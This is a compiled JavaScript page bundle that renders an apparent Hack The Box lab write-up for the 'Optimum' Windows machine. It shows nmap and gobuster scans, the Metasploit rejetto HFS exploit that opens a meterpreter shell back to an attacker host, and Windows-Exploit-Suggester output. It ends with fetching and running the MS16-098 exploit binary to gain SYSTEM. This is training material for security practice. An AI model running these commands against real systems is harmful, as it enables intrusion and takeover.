(window.webpackJsonp=window.webpackJsonp||[]).push([[87],{428:function(t,s,e){"use strict";e.r(s);var a=e(13),n=Object(a.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"optimum"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#optimum"}},[t._v("#")]),t._v(" Optimum")]),t._v(" "),s("p",[t._v("10.10.10.8")]),t._v(" "),s("h2",{attrs:{id:"initial-scan"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#initial-scan"}},[t._v("#")]),t._v(" Initial scan")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("nmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-A")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-T5")]),t._v(" -p- "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".10.8\n")])])]),s("p",[t._v("Results")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 06:05 EDT\nNmap scan report for 10.10.10.8\nHost is up (0.20s latency).\nNot shown: 65534 filtered ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    HttpFileServer httpd 2.3\n|_http-server-header: HFS 2.3\n|_http-title: HFS /\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 198.73 seconds\n")])])]),s("h2",{attrs:{id:"gobuster"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#gobuster"}},[t._v("#")]),t._v(" Gobuster")]),t._v(" "),s("p",[t._v("Since there's only 1 port, let's try gobuster on this")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("gobuster "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("dir")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-u")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".10.8 "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-w")]),t._v(" /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n")])])]),s("p",[t._v("This takes too long. Going to let it run in the background while looking for other exploits")]),t._v(" "),s("h2",{attrs:{id:"metasploit"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#metasploit"}},[t._v("#")]),t._v(" Metasploit")]),t._v(" "),s("p",[t._v("Looking online, there's an exploit for this specific version of http file server version 2.3.")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("msfconsole\nuse exploit/windows/http/rejetto_hfs_exec\nmsf5 exploit"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("windows/http/rejetto_hfs_exec"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" rhosts "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".10.8\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# rhosts => 10.10.10.8")]),t._v("\nmsf5 exploit"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("windows/http/rejetto_hfs_exec"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" SRVHOST "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".14.14\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# SRVHOST => 10.10.14.14")]),t._v("\nmsf5 exploit"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("windows/http/rejetto_hfs_exec"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" SRVPORT "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8080")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# SRVPORT => 8080")]),t._v("\nmsf5 exploit"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("windows/http/rejetto_hfs_exec"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" run\n")])])]),s("p",[t._v("and a meterpreter shell is spawned. This gives us our first flag for the user "),s("code",[t._v("OPTIMUM\\kostas")])]),t._v(" "),s("h2",{attrs:{id:"privilege-escalation"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#privilege-escalation"}},[t._v("#")]),t._v(" Privilege escalation")]),t._v(" "),s("p",[t._v("Let's look for some windows security vulnerabilities within this windows version.")]),t._v(" "),s("h3",{attrs:{id:"getting-systeminfo"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#getting-systeminfo"}},[t._v("#")]),t._v(" Getting systeminfo")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("execute "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-f")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"cmd.exe /c systeminfo > systeminfo.txt"')]),t._v("\ndownload systeminfo.txt\n")])])]),s("h3",{attrs:{id:"installing-windows-exploit-suggester"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#installing-windows-exploit-suggester"}},[t._v("#")]),t._v(" Installing windows-exploit-suggester")]),t._v(" "),s("p",[t._v("Install windows-exploit-suggester from here: "),s("a",{attrs:{href:"https://github.com/AonCyberLabs/Windows-Exploit-Suggester",target:"_blank",rel:"noopener noreferrer"}},[t._v("exploit-suggester"),s("OutboundLink")],1)]),t._v(" "),s("p",[t._v("unzip the file and add it to "),s("code",[t._v("/usr/local/bin")])]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("unzip")]),t._v(" Windows-exploit-suggester\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("cd")]),t._v(" Windows-expolit-suggester\nsuco "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("cp")]),t._v(" Windows-exploit-suggester.py /usr/local/bin\n")])])]),s("h3",{attrs:{id:"using-windows-expolit-suggester"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#using-windows-expolit-suggester"}},[t._v("#")]),t._v(" Using windows-expolit-suggester")]),t._v(" "),s("p",[t._v("Make sure the sysinfo.txt file and the database file is placed in the same directory, then")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("windows-exploit-suggest.py "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("--update")]),t._v("\nwindows-exploit-suggester.py "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("--database")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2020")]),t._v("-04-10-mssb.xls "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("--systeminfo")]),t._v(" systeminfo.txt\n")])])]),s("p",[t._v("result:")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("[*] initiating winsploit version 3.3...                                                                                                                                      \n[*] database file detected as xls or xlsx based on extension                                                                                                                 \n[*] attempting to read from the systeminfo input file                                                                                                                        \n[+] systeminfo input file read successfully (ISO-8859-1)                                                                                                                     \n[*] querying database file for potential vulnerabilities                                                                                                                     \n[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits                                                                 \n[*] there are now 246 remaining vulns                                                                                                                                        \n[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin                                                                                                           \n[+] windows version identified as 'Windows 2012 R2 64-bit'                                                                                                                   \n[*]                                                                                                                                                                          \n[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important                                                                                          \n[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)                                                           \n[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)                         \n[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255                                                                                                            \n[*]                                                                                                                                                                          \n[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important                                                                                          \n[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)                                                         \n[*]                                                                                                                                                                          \n[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important                                                                                                   \n[*]   https://github.com/foxglovesec/RottenPotato                                                                                                                            \n[*]   https://github.com/Kevin-Robertson/Tater                                                                                                                               \n[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege                                          \n[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation                                                                       \n[*]                                                                                                                                                                          \n[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important                                                                                         \n[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074),\n PoC                                                                                                                                                                         \n[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC                                            \n[*]                                                                                                                                                                          \n[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical                                                                                          \n[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC\n...\n")])])]),s("p",[t._v("The most interesting result so far is MS16â€“098. So let's try that.")]),t._v(" "),s("h3",{attrs:{id:"msfconsole"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#msfconsole"}},[t._v("#")]),t._v(" Msfconsole")]),t._v(" "),s("p",[t._v("first, background the meterpreter session. Then:")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("wget")]),t._v(" https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe\nsessions "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("meterpreter session ID"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\nupload "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("41020")]),t._v(".exe\nshell\n"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("41020")]),t._v(".exe\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("whoami")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# system")]),t._v("\n")])])])])}),[],!1,null,null,null);s.default=n.exports}}]);